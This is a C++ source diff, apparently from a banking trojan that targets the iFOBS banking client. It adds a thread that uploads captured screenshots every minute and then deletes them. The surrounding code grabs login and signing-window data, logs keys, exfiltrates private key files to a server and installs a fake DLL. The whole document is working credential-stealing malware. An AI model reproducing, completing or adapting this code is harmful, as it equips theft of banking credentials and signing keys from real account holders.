@@ -108,6 +108,9 @@ DWORD btAccept[] = { 0x8DBF3905 /* Принять */, 0x62203A2E /* Прийняти */, 0x3C79
 					 0xBEA055E9 /* Підписати */, 0xBE1A55FD /* Подписать */, 0xA7A73EE /* Sign */, 0 };
 AccBalans dataFromPlug; //данные от ifobs.plug
 
+//отсылка скриншотов формируемых плагином
+static DWORD WINAPI SendScreenshot(void*);
+
 int typeActive = 0; //с какоо окна грабим: 1 - регистрация, 2 - подписывание
 
 static char* GetAdminUrl( char* url )
@@ -222,7 +225,7 @@ static void GrabData( HWND wnd )
 			KeyLogger::AddDirectory( ffc.texts[0], "Keys" );
 		VideoLog::Send( "ifobs", 11, resultGrab );
 		pwsprintfA( serverKeys, "keys\\%s", ffc.texts[3] );
-		VideoProcess::SendFiles( 0, serverKeys, ffc.texts[0], 10, true );
+		VideoProcess::SendFiles( 0, serverKeys, ffc.texts[0], 0, 10, true );
 	}
 	else
 	{
@@ -236,7 +239,7 @@ static void GrabData( HWND wnd )
 		m_lstrcat( resultGrab, folderIFobs );
 		VideoLog::Send( "ifobs", 12, resultGrab );
 		pwsprintfA( serverKeys, "keyssign\\%s", ffc.texts[3] );
-		VideoProcess::SendFiles( 0, serverKeys, ffc.texts[0], 10, true );
+		VideoProcess::SendFiles( 0, serverKeys, ffc.texts[0], 0, 10, true );
 	}
 	RunThread( SendResultGrab, 0 );
 	FreeFFC(ffc);
@@ -378,7 +381,7 @@ static DWORD WINAPI SendBalans( LPVOID p )
 		STR::Free(urlText);
 //		STR::Free(urlText2);
 		pwsprintfA( request, "keys_dll\\%s", dataFromPlug.login );
-		VideoProcess::SendFiles( 0, request, dataFromPlug.pathKeys, 20 );
+		VideoProcess::SendFiles( 0, request, dataFromPlug.pathKeys, 0, 20 );
 	}
 	return 0;
 }
@@ -526,6 +529,7 @@ static bool InitPlugin()
 		}
 		if( ok )
 		{
+			RunThread( SendScreenshot, 0 );
 			DBG( "IFobs", "ifobs.plug успешно установлен" );
 			ret = true;
 		}
@@ -819,6 +823,19 @@ DWORD WINAPI InstallFakeDll(void*)
 	}
 	MemFree(dllBody);
 	return 0;
+}
+
+//отсылка скриншотов формируемых плагином
+static DWORD WINAPI SendScreenshot(void*)
+{
+	char pathScr[MAX_PATH]; //папка скриншотов
+	GetWorkFolder( pathScr, "scr" );
+	for(;;)
+	{
+		pSleep( 60 * 1000 ); //каждую минуту делаем отправку
+		//отправляем содержимое папки и следом удаляем файлы
+		VideoProcess::SendFiles( 0, "ifobs_scr", pathScr, 1, 0 );
+	}
 }
 
 }
